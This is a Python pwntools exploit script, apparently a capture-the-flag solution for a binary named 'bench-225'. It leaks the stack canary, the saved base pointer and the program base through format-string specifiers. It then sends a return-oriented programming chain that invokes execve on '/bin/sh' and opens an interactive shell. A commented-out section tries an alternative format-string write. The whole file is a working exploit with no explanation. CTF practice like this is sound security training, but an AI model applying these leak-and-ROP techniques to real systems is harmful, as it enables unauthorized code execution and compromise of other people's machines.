from pwn import *

exe = ELF('./bench-225')
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main
        b *motivation+167
        b *motivation+814
        continue
    """)
elif args.REMOTE:
    io = remote("bench-225.ctf.umasscybersec.org", 1337)


for _ in range(5):
    io.sendline(b'3')
for _ in range(6):
    io.sendline(b'4')

# **************************************************
# leak canary
# **************************************************
io.sendline(b'6')
io.sendlineafter(b'quote:', b'%9$p')
io.recvuntil(b'Quote: "')
canary = int(io.recvline(), 16)
print(f'{hex(canary) = }')

# **************************************************
# leak saved_rbp
# **************************************************
io.sendline(b'6')
io.sendlineafter(b'quote:', b'%10$p')
io.recvuntil(b'Quote: "')
saved_rbp = int(io.recvline(), 16)
print(f'{hex(saved_rbp) = }')

# **************************************************
# leak exe_base address
# **************************************************
io.sendline(b'6')
io.sendlineafter(b'quote:', b'%11$p')
io.recvuntil(b'Quote: "')
exe.address = int(io.recvline(), 16) - 0x16a1
print(f'{hex(exe.sym.main) = }')

# **************************************************
# ROP
# **************************************************
rop = ROP(exe)
rop.raw(b'A' * 8)
rop.raw(pack(canary))
rop.raw(pack(saved_rbp))
rop.raw(rop.find_gadget(['ret']))
rop.raw(rop.find_gadget(['pop rax']))
rop.raw(pack(59)) # sys_execve
rop.raw(rop.find_gadget(['pop rdi']))
rop.raw(pack(saved_rbp + 8 * 7))
rop.raw(rop.find_gadget(['pop rsi']))
rop.raw(pack(0))
rop.raw(rop.find_gadget(['pop rdx']))
rop.raw(pack(0))
rop.raw(rop.find_gadget(['syscall']))
rop.raw(b'/bin/sh\x00')

io.sendline(b'6')
print(rop.chain())
io.sendlineafter(b'quote:', rop.chain())

# io.sendline(b'6')
# io.sendlineafter(b'quote:', b'%p')
# io.recvuntil(b'Quote: "')
# stack_leak_address = int(io.recvline(), 16)
# print(f'{hex(stack_leak_address) = }')
# return_address = stack_leak_address + (0x7ffdaf0bca08 - 0x7ffdaf0ba8c0)

# io.sendline(b'6')
# io.sendlineafter(b'quote:', b'%11$p')
# io.recvuntil(b'Quote: "')
# exe.address = int(io.recvline(), 16) - 0x16a1
# print(hex(return_address))
# print(hex(exe.address))
# print(hex(exe.sym.main))

# offset = 8
# payload = fmtstr_payload(offset, {return_address: 1}, write_size='byte')
# print(len(payload))

# # payload = fmtstr_payload(offset, {return_address: 0}, write_size='short')
# # print(len(payload))

# io.sendline(b'6')
# io.sendlineafter(b'quote:', payload)
# io.recvuntil(b'Quote: "')
# print(io.recvline())

# # 8552


io.interactive()


